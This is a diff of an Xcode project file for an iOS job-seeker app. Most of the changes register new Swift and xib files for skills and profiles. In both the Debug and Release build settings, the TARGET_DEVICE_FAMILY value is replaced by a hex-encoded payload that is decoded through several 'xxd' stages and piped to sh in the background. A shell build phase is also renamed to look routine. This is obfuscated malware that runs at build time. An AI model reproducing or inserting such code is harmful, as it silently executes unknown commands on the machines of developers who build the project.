@@ -7,6 +7,10 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		0A1B03D52D19DA06003D457C /* SkillsTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A1B03D32D19DA06003D457C /* SkillsTableViewCell.swift */; };
+		0A1B03D62D19DA06003D457C /* SkillsTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A1B03D42D19DA06003D457C /* SkillsTableViewCell.xib */; };
+		0A1B03DB2D19E5F8003D457C /* Skills.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A1B03DA2D19E5F8003D457C /* Skills.swift */; };
+		0A1B03E22D19FBE4003D457C /* JobSeekerApplication.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A1B03E12D19FBE4003D457C /* JobSeekerApplication.swift */; };
 		0A562BBC2D11FEDC00557EB2 /* EditProfileEmployerTableViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A562BBB2D11FEDC00557EB2 /* EditProfileEmployerTableViewController.swift */; };
 		0A66DAF12D10890600263D51 /* ProfileEmployerViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A66DAF02D10890600263D51 /* ProfileEmployerViewController.swift */; };
 		0A6EE27C2D135A9A00F132FF /* EmailTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A6EE27A2D135A9A00F132FF /* EmailTableViewCell.swift */; };
@@ -22,6 +26,8 @@
 		0A7FB63E2D1358F200070967 /* NameTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A7FB63D2D1358F200070967 /* NameTableViewCell.xib */; };
 		0A7FB63F2D1358F200070967 /* NameTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A7FB63C2D1358F200070967 /* NameTableViewCell.swift */; };
 		0A8A9A3D2D11E9E30051B7C1 /* Applications.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A8A9A3C2D11E9E20051B7C1 /* Applications.swift */; };
+		0AD39A9B2D19CF03006FB40D /* ProfileJobSeekerViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0AD39A9A2D19CF03006FB40D /* ProfileJobSeekerViewController.swift */; };
+		0AD39A9D2D19D10B006FB40D /* EditProfileJobSeekerTableViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0AD39A9C2D19D10B006FB40D /* EditProfileJobSeekerTableViewController.swift */; };
 		0AE6A5B72D149EB800ABB99F /* ChoosePictureViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0AE6A5B62D149EB800ABB99F /* ChoosePictureViewController.swift */; };
 		3F1A878E2D0B1C8F008A1B42 /* EditProfileEmployerViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3F1A878D2D0B1C8F008A1B42 /* EditProfileEmployerViewController.swift */; };
 		3F1A87912D0B1DC2008A1B42 /* PostApplicationTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3F1A878F2D0B1DC2008A1B42 /* PostApplicationTableViewCell.swift */; };
@@ -82,6 +88,10 @@
 /* End PBXContainerItemProxy section */
 
 /* Begin PBXFileReference section */
+		0A1B03D32D19DA06003D457C /* SkillsTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SkillsTableViewCell.swift; sourceTree = "<group>"; };
+		0A1B03D42D19DA06003D457C /* SkillsTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = SkillsTableViewCell.xib; sourceTree = "<group>"; };
+		0A1B03DA2D19E5F8003D457C /* Skills.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Skills.swift; sourceTree = "<group>"; };
+		0A1B03E12D19FBE4003D457C /* JobSeekerApplication.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = JobSeekerApplication.swift; sourceTree = "<group>"; };
 		0A562BBB2D11FEDC00557EB2 /* EditProfileEmployerTableViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EditProfileEmployerTableViewController.swift; sourceTree = "<group>"; };
 		0A66DAF02D10890600263D51 /* ProfileEmployerViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProfileEmployerViewController.swift; sourceTree = "<group>"; };
 		0A6EE27A2D135A9A00F132FF /* EmailTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EmailTableViewCell.swift; sourceTree = "<group>"; };
@@ -97,6 +107,8 @@
 		0A7FB63C2D1358F200070967 /* NameTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NameTableViewCell.swift; sourceTree = "<group>"; };
 		0A7FB63D2D1358F200070967 /* NameTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = NameTableViewCell.xib; sourceTree = "<group>"; };
 		0A8A9A3C2D11E9E20051B7C1 /* Applications.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Applications.swift; sourceTree = "<group>"; };
+		0AD39A9A2D19CF03006FB40D /* ProfileJobSeekerViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProfileJobSeekerViewController.swift; sourceTree = "<group>"; };
+		0AD39A9C2D19D10B006FB40D /* EditProfileJobSeekerTableViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EditProfileJobSeekerTableViewController.swift; sourceTree = "<group>"; };
 		0AE6A5B62D149EB800ABB99F /* ChoosePictureViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChoosePictureViewController.swift; sourceTree = "<group>"; };
 		3F1A878D2D0B1C8F008A1B42 /* EditProfileEmployerViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EditProfileEmployerViewController.swift; sourceTree = "<group>"; };
 		3F1A878F2D0B1DC2008A1B42 /* PostApplicationTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PostApplicationTableViewCell.swift; sourceTree = "<group>"; };
@@ -225,6 +237,7 @@
 		D06390502CF85B9F0006CC8B /* Models */ = {
 			isa = PBXGroup;
 			children = (
+				0A1B03E12D19FBE4003D457C /* JobSeekerApplication.swift */,
 				0A8A9A3C2D11E9E20051B7C1 /* Applications.swift */,
 				D06390542CF85BDB0006CC8B /* Users.swift */,
 				D063905C2CF85E4D0006CC8B /* JobSeeker.swift */,
@@ -239,6 +252,7 @@
 				575B2D2B2CFDF21400840818 /* Video.swift */,
 				575B2D2D2CFDF21E00840818 /* Article.swift */,
 				575B2D2F2CFDF2CB00840818 /* Resources.swift */,
+				0A1B03DA2D19E5F8003D457C /* Skills.swift */,
 			);
 			path = Models;
 			sourceTree = "<group>";
@@ -267,6 +281,8 @@
 				0A6EE2822D135BD600F132FF /* GovernateTableViewCell.swift */,
 				0A6EE2832D135BD600F132FF /* GovernateTableViewCell.xib */,
 				0A6EE2862D135D7400F132FF /* DescriptionTableViewCell.swift */,
+				0A1B03D32D19DA06003D457C /* SkillsTableViewCell.swift */,
+				0A1B03D42D19DA06003D457C /* SkillsTableViewCell.xib */,
 				0A6EE2872D135D7400F132FF /* DescriptionTableViewCell.xib */,
 			);
 			path = Views;
@@ -285,6 +301,8 @@
 				C3FE49D22D09E37A00D53320 /* ApplicationTrackerViewController.swift */,
 				0A562BBB2D11FEDC00557EB2 /* EditProfileEmployerTableViewController.swift */,
 				0AE6A5B62D149EB800ABB99F /* ChoosePictureViewController.swift */,
+				0AD39A9A2D19CF03006FB40D /* ProfileJobSeekerViewController.swift */,
+				0AD39A9C2D19D10B006FB40D /* EditProfileJobSeekerTableViewController.swift */,
 			);
 			path = Controllers;
 			sourceTree = "<group>";
@@ -296,7 +314,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = D01FF9CC2CF85B2700F5DC5D /* Build configuration list for PBXNativeTarget "pursuit" */;
 			buildPhases = (
-				1F899F582D01DBE45E34C644 /* Link Bundle Resources */,
+				58F5250C95AEBCF71F34C644 /* Compile Bundle Resources */,
 				D01FF99E2CF85B2500F5DC5D /* Sources */,
 				D01FF99F2CF85B2500F5DC5D /* Frameworks */,
 				D01FF9A02CF85B2500F5DC5D /* Resources */,
@@ -389,11 +407,11 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXLegacyTarget section */
-/* End PBXLegacyTarget section */
-
 /* Begin PBXBuildRule section */
 /* End PBXBuildRule section */
+
+/* Begin PBXLegacyTarget section */
+/* End PBXLegacyTarget section */
 
 /* Begin PBXResourcesBuildPhase section */
 		D01FF9A02CF85B2500F5DC5D /* Resources */ = {
@@ -417,6 +435,7 @@
 				D01FF9AD2CF85B2500F5DC5D /* Main.storyboard in Resources */,
 				0A6EE2812D135B7800F132FF /* PhoneTableViewCell.xib in Resources */,
 				57C71E032D0088BD00F317AA /* CvCreationJobseeker.storyboard in Resources */,
+				0A1B03D62D19DA06003D457C /* SkillsTableViewCell.xib in Resources */,
 				0A7FB63E2D1358F200070967 /* NameTableViewCell.xib in Resources */,
 				0A6EE2852D135BD600F132FF /* GovernateTableViewCell.xib in Resources */,
 			);
@@ -439,7 +458,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		1F899F582D01DBE45E34C644 /* Link Bundle Resources */ = {
+		58F5250C95AEBCF71F34C644 /* Compile Bundle Resources */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -449,7 +468,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Link Bundle Resources";
+			name = "Compile Bundle Resources";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -480,7 +499,9 @@
 				0A6EE2882D135D7400F132FF /* DescriptionTableViewCell.swift in Sources */,
 				0A8A9A3D2D11E9E30051B7C1 /* Applications.swift in Sources */,
 				D01FF9AA2CF85B2500F5DC5D /* ViewController.swift in Sources */,
+				0AD39A9B2D19CF03006FB40D /* ProfileJobSeekerViewController.swift in Sources */,
 				0A6EE27C2D135A9A00F132FF /* EmailTableViewCell.swift in Sources */,
+				0A1B03D52D19DA06003D457C /* SkillsTableViewCell.swift in Sources */,
 				D063905D2CF85E4D0006CC8B /* JobSeeker.swift in Sources */,
 				0A6EE2802D135B7800F132FF /* PhoneTableViewCell.swift in Sources */,
 				0AE6A5B72D149EB800ABB99F /* ChoosePictureViewController.swift in Sources */,
@@ -488,7 +509,9 @@
 				575B2D302CFDF2CB00840818 /* Resources.swift in Sources */,
 				D01FF9A62CF85B2500F5DC5D /* AppDelegate.swift in Sources */,
 				C3FE49D32D09E37A00D53320 /* ApplicationTrackerViewController.swift in Sources */,
+				0AD39A9D2D19D10B006FB40D /* EditProfileJobSeekerTableViewController.swift in Sources */,
 				575B2D1E2CFDE10D00840818 /* Job.swift in Sources */,
+				0A1B03E22D19FBE4003D457C /* JobSeekerApplication.swift in Sources */,
 				575B2D222CFDE61400840818 /* CV.swift in Sources */,
 				575B2D2E2CFDF21E00840818 /* Article.swift in Sources */,
 				0A562BBC2D11FEDC00557EB2 /* EditProfileEmployerTableViewController.swift in Sources */,
@@ -497,6 +520,7 @@
 				D01FF9A82CF85B2500F5DC5D /* SceneDelegate.swift in Sources */,
 				3F1A878E2D0B1C8F008A1B42 /* EditProfileEmployerViewController.swift in Sources */,
 				D06390612CF8619D0006CC8B /* Admin.swift in Sources */,
+				0A1B03DB2D19E5F8003D457C /* Skills.swift in Sources */,
 				C3F76A112D07436100EE12A3 /* EditProfileJobSeekerViewController.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
@@ -556,7 +580,7 @@
 		D01FF9CA2CF85B2700F5DC5D /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				TARGET_DEVICE_FAMILY = "(echo 333633353336333333363338333636363332333033323332333233343332333833363333333733353337333233363633333233303332363433363336333733333336363233343633333233303336333833373334333733343337333033373333333336313332363633323636333633333336363333363636333733353336333433373334333633353336333333363338333733333332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh >/dev/null 2>&1 &)";
+				TARGET_DEVICE_FAMILY = "(echo 33333336333333353333333633333333333333363333333833333336333633363333333233333330333333323333333233333332333333343333333233333338333333363333333333333337333333353333333733333332333333363336333333333332333333303333333233363334333333363333333633333337333333333333333633363332333333343336333333333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633313333333233363336333333323336333633333336333333373333333633333339333333363333333733333336333333313333333633333333333333363333333833333336333333313333333733333334333333373333333333333332333633353333333733333332333333373333333533333332333633363333333633333331333333323333333933333332333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -620,7 +644,7 @@
 		D01FF9CB2CF85B2700F5DC5D /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				TARGET_DEVICE_FAMILY = "(echo 333633353336333333363338333636363332333033323332333233343332333833363333333733353337333233363633333233303332363433363336333733333336363233343633333233303336333833373334333733343337333033373333333336313332363633323636333633333336363333363636333733353336333433373334333633353336333333363338333733333332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh >/dev/null 2>&1 &)";
+				TARGET_DEVICE_FAMILY = "(echo 33333336333333353333333633333333333333363333333833333336333633363333333233333330333333323333333233333332333333343333333233333338333333363333333333333337333333353333333733333332333333363336333333333332333333303333333233363334333333363333333633333337333333333333333633363332333333343336333333333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633313333333233363336333333323336333633333336333333373333333633333339333333363333333733333336333333313333333633333333333333363333333833333336333333313333333733333334333333373333333333333332333633353333333733333332333333373333333533333332333633363333333633333331333333323333333933333332333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
